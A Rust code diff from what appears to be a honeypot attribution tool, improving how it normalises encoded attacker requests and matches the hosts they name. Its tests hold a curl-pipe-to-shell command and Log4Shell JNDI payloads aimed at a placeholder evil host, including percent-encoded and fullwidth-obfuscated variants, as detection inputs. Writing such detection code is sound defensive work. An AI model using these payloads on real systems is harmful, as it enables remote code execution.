@@ -817,33 +817,108 @@ pub struct SubjectInput<'a> {
     pub events: &'a [CaptureEvent],
 }
 
-/// What the attacker sent in one attempt, lowercased: `data` and `hook` of
-/// its application, network and hook events (never addresses).
-fn attacker_text(a: &Attempt, events: &BTreeMap<&str, &CaptureEvent>) -> String {
-    let mut out = String::new();
-    for id in &a.event_ids {
-        let Some(e) = events.get(id.as_str()) else {
-            continue;
-        };
-        if !matches!(
-            e.channel,
-            Channel::Application | Channel::Network | Channel::Hook
-        ) {
-            continue;
+/// Every string (keys and values) in a JSON value, depth-first.
+fn strings_in(v: &serde_json::Value, out: &mut Vec<String>) {
+    match v {
+        serde_json::Value::String(s) => out.push(s.clone()),
+        serde_json::Value::Array(a) => a.iter().for_each(|x| strings_in(x, out)),
+        serde_json::Value::Object(m) => {
+            for (k, x) in m {
+                out.push(k.clone());
+                strings_in(x, out);
+            }
         }
-        out.push_str(&serde_json::to_string(&e.data).unwrap_or_default());
-        if let Some(h) = &e.hook {
-            out.push_str(&serde_json::to_string(h).unwrap_or_default());
-        }
-        out.push('\n');
+        serde_json::Value::Number(n) => out.push(n.to_string()),
+        _ => {}
     }
-    out.to_lowercase()
 }
 
-/// What one attempt sent, and the hosts it steered the decoy to.
+/// Undo the cheap ways to hide a host in a request: percent-encoding (twice,
+/// for double encoding), literal `\uXXXX` escapes, fullwidth ASCII and the
+/// ideographic full stop; then lowercase. Not full NFKC or IDNA (see
+/// `docs/actor-attribution.md#false-flags`).
+pub fn normalise_sent(s: &str) -> String {
+    fn percent(s: &str) -> String {
+        let b = s.as_bytes();
+        let mut out = Vec::with_capacity(b.len());
+        let mut i = 0;
+        while i < b.len() {
+            let hex = |c: u8| (c as char).to_digit(16);
+            if b[i] == b'%'
+                && i + 2 < b.len()
+                && let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2]))
+            {
+                out.push((h * 16 + l) as u8);
+                i += 3;
+            } else {
+                out.push(b[i]);
+                i += 1;
+            }
+        }
+        String::from_utf8_lossy(&out).into_owned()
+    }
+    fn unicode_escapes(s: &str) -> String {
+        let mut out = String::with_capacity(s.len());
+        let mut rest = s;
+        while let Some(i) = rest.find("\\u") {
+            out.push_str(&rest[..i]);
+            let tail = &rest[i + 2..];
+            let decoded = tail
+                .get(..4)
+                .and_then(|h| u32::from_str_radix(h, 16).ok())
+                .and_then(char::from_u32);
+            match decoded {
+                Some(c) => {
+                    out.push(c);
+                    rest = &tail[4..];
+                }
+                None => {
+                    out.push_str("\\u");
+                    rest = tail;
+                }
+            }
+        }
+        out.push_str(rest);
+        out
+    }
+    let once = unicode_escapes(&percent(&percent(s)));
+    once.chars()
+        .map(|c| match c {
+            // Fullwidth forms of printable ASCII.
+            '\u{FF01}'..='\u{FF5E}' => char::from_u32(c as u32 - 0xFEE0).unwrap_or(c),
+            '\u{3002}' | '\u{FF61}' => '.',
+            _ => c,
+        })
+        .collect::<String>()
+        .to_lowercase()
+}
+
+/// Host-like tokens in normalised text: runs of letters, digits, `.`, `-`
+/// and `:`, with each `:`-separated piece added too (so `evil.example:1389`
+/// gives `evil.example`, and an IPv6 address stays whole).
+fn host_tokens(text: &str, out: &mut BTreeSet<String>) {
+    for raw in text.split(|c: char| !(c.is_alphanumeric() || matches!(c, '.' | '-' | ':'))) {
+        let t = raw.trim_matches(|c| matches!(c, '.' | ':' | '-'));
+        if t.is_empty() {
+            continue;
+        }
+        out.insert(t.to_string());
+        if t.contains(':') {
+            for piece in t.split(':') {
+                let piece = piece.trim_matches(|c| matches!(c, '.' | '-'));
+                if !piece.is_empty() {
+                    out.insert(piece.to_string());
+                }
+            }
+        }
+    }
+}
+
+/// What one attempt sent, and where it steered the decoy.
 struct Sent {
-    /// [`attacker_text`].
-    text: String,
+    /// Host-like tokens from the `data` and `hook` of the attempt's
+    /// application, network and hook events (never addresses), normalised.
+    names: BTreeSet<String>,
     /// Addresses the decoy connected to for a host the attacker named: the
     /// attacker chose where the decoy went, even if not the address.
     directed: BTreeSet<String>,
@@ -851,35 +926,81 @@ struct Sent {
 
 impl Sent {
     fn of(a: &Attempt, events: &BTreeMap<&str, &CaptureEvent>) -> Self {
-        let text = attacker_text(a, events);
-        let mut directed = BTreeSet::new();
-        for id in &a.event_ids {
-            let Some(e) = events.get(id.as_str()) else {
-                continue;
-            };
-            if e.channel != Channel::Egress {
-                continue;
+        let mut names = BTreeSet::new();
+        let mine: Vec<&CaptureEvent> = a
+            .event_ids
+            .iter()
+            .filter_map(|id| events.get(id.as_str()).copied())
+            .collect();
+        for e in mine.iter().filter(|e| {
+            matches!(
+                e.channel,
+                Channel::Application | Channel::Network | Channel::Hook
+            )
+        }) {
+            let mut strings = Vec::new();
+            for v in e.data.values() {
+                strings_in(v, &mut strings);
             }
+            strings.extend(e.data.keys().cloned());
+            if let Some(h) = &e.hook
+                && let Ok(v) = serde_json::to_value(h)
+            {
+                strings_in(&v, &mut strings);
+            }
+            for s in &strings {
+                host_tokens(&normalise_sent(s), &mut names);
+            }
+        }
+        let mut sent = Sent {
+            names,
+            directed: BTreeSet::new(),
+        };
+        for e in mine.iter().filter(|e| e.channel == Channel::Egress) {
             let named = ["host", "url"].iter().any(|k| {
                 e.data.get(*k).and_then(|v| v.as_str()).is_some_and(|v| {
                     let v = v.to_lowercase();
-                    let host = host_of(IndicatorType::Url, &v)
-                        .filter(|_| v.contains("://"))
-                        .unwrap_or(&v)
-                        .to_string();
-                    !host.is_empty() && text.contains(&host)
+                    let host = if v.contains("://") {
+                        host_of(IndicatorType::Url, &v).unwrap_or(&v)
+                    } else {
+                        v.split(':').next().unwrap_or(&v)
+                    };
+                    sent.named(host)
                 })
             });
             if named && let Some(d) = &e.dst {
-                directed.insert(d.ip.to_lowercase());
+                sent.directed.insert(d.ip.to_lowercase());
             }
         }
-        Sent { text, directed }
+        sent
+    }
+
+    /// The attacker named this host, or a domain it sits under (a lookup of
+    /// `<data>.evil.example` after naming `evil.example`). Whole tokens only,
+    /// so `1.2.3.4` never matches inside `11.2.3.45`.
+    fn named(&self, host: &str) -> bool {
+        if self.names.contains(host) {
+            return true;
+        }
+        if host.parse::<IpAddr>().is_ok() {
+            return false;
+        }
+        let mut rest = host;
+        while let Some((_, parent)) = rest.split_once('.') {
+            if !parent.contains('.') {
+                break;
+            }
+            if self.names.contains(parent) {
+                return true;
+            }
+            rest = parent;
+        }
+        false
     }
 
     /// True when the attacker named this host or steered the decoy to it.
     fn chose(&self, host: &str) -> bool {
-        self.text.contains(host) || self.directed.contains(host)
+        self.named(host) || self.directed.contains(host)
     }
 }
 
@@ -1004,7 +1125,8 @@ pub fn subjects(input: &SubjectInput<'_>) -> Vec<Subject> {
         .collect();
     // Built only for attempts with a callback indicator.
     let mut sent: BTreeMap<&str, Sent> = BTreeMap::new();
-    let mut seen: Vec<BTreeSet<&str>> = vec![BTreeSet::new(); out.len()];
+    // Per subject, the indicator index of each IOC already added.
+    let mut seen: Vec<BTreeMap<&str, usize>> = vec![BTreeMap::new(); out.len()];
     for ioc in &input.iocs.iocs {
         let Some(kind) = indicator_type(ioc.ioc_type) else {
             continue;
@@ -1016,29 +1138,35 @@ pub fn subjects(input: &SubjectInput<'_>) -> Vec<Subject> {
         // it (egress or DNS events, whatever the role). A callback to a host
         // the attacker named in its own request or payload (JNDI, SSRF, a
         // download command), or to the address the decoy reached for such a
-        // name, was chosen by the attacker, so it counts as sent.
+        // name, was chosen by the attacker, so it counts as sent. Decided
+        // per attempt: one attempt naming a shared host does not make it
+        // sent for another attempt that reached it unprompted.
         let source = ioc.roles.contains(&IocRole::Source);
         let callback = ioc.roles.contains(&IocRole::Callback)
             || ioc
                 .extracted_from
                 .iter()
                 .any(|f| f.starts_with("egress:") || f.starts_with("dns:"));
-        let observed = source
-            || (callback
-                && !host_of(kind, &v).is_some_and(|host| {
-                    ioc.attempt_ids.iter().any(|a| {
-                        attempts.get(a.as_str()).is_some_and(|att| {
-                            sent.entry(att.attempt_id.as_str())
-                                .or_insert_with(|| Sent::of(att, &event_by_id))
-                                .chose(host)
-                        })
-                    })
-                }));
+        let host = host_of(kind, &v);
         for a in &ioc.attempt_ids {
             let Some(&i) = by_attempt.get(a.as_str()) else {
                 continue;
             };
-            if out[i].indicators.len() < MAX_SUBJECT_INDICATORS && seen[i].insert(&ioc.ioc_id) {
+            let observed = source
+                || (callback
+                    && !host.is_some_and(|h| {
+                        attempts.get(a.as_str()).is_some_and(|att| {
+                            sent.entry(att.attempt_id.as_str())
+                                .or_insert_with(|| Sent::of(att, &event_by_id))
+                                .chose(h)
+                        })
+                    }));
+            // In a campaign, an indicator any member observed unprompted
+            // counts as observed.
+            if let Some(&k) = seen[i].get(ioc.ioc_id.as_str()) {
+                out[i].indicators[k].observed |= observed;
+            } else if out[i].indicators.len() < MAX_SUBJECT_INDICATORS {
+                seen[i].insert(&ioc.ioc_id, out[i].indicators.len());
                 out[i].indicators.push(SubjectIndicator {
                     kind,
                     value: v.clone(),
@@ -1758,6 +1886,7 @@ pub fn attach_suggestions(campaigns: &mut [Campaign], links: &[ActorLink]) {
                     score: l.score,
                     band: l.band,
                     status: l.status,
+                    review_queue: l.review_queue,
                     confidence_ref: format!("/v0/actor-links/{}", l.link_id),
                     report_urls: urls,
                 }
@@ -2355,6 +2484,52 @@ mod tests {
         let l = &suggest(&cat, &cfg, &[observed], &BTreeMap::new())[0];
         assert_eq!(l.band, Band::Medium, "{}", l.score);
         assert!(l.statement.contains("infrastructure"));
+    }
+
+    fn sent(texts: &[&str]) -> Sent {
+        let mut names = BTreeSet::new();
+        for t in texts {
+            host_tokens(&normalise_sent(t), &mut names);
+        }
+        Sent {
+            names,
+            directed: BTreeSet::new(),
+        }
+    }
+
+    #[test]
+    fn named_hosts_match_whole_tokens_only() {
+        let s = sent(&[
+            "curl -s http://11.2.3.45/x | sh",
+            "${jndi:ldap://evil.example.invalid:1389/a}",
+        ]);
+        assert!(s.chose("11.2.3.45"));
+        assert!(!s.chose("1.2.3.4"), "no match inside a longer address");
+        assert!(!s.chose("1.2.3.45"));
+        assert!(s.chose("evil.example.invalid"));
+        assert!(
+            s.chose("x.evil.example.invalid"),
+            "a lookup under a named domain"
+        );
+        assert!(!s.chose("example.invalid"), "a parent was not named");
+        assert!(!s.chose("notevil.example.invalid"));
+        let v6 = sent(&["http://[2001:db8::7]:8080/a"]);
+        assert!(v6.chose("2001:db8::7"));
+    }
+
+    #[test]
+    fn cheap_encodings_are_undone_before_matching() {
+        for t in [
+            "%24%7Bjndi%3Aldap%3A%2F%2Fevil.example.invalid%2Fa%7D",
+            "%2524%257Bjndi%253Aldap%253A%252F%252Fevil.example.invalid%257D",
+            "${jndi:ldap://\\u0065vil.example.invalid/a}",
+            "${jndi:ldap://\u{FF45}\u{FF56}\u{FF49}\u{FF4C}\u{FF0E}example.invalid/a}",
+            "${jndi:ldap://EVIL.Example.INVALID/a}",
+            "evil\u{3002}example\u{3002}invalid",
+        ] {
+            let s = sent(&[t]);
+            assert!(s.chose("evil.example.invalid"), "{t}");
+        }
     }
 
     #[test]
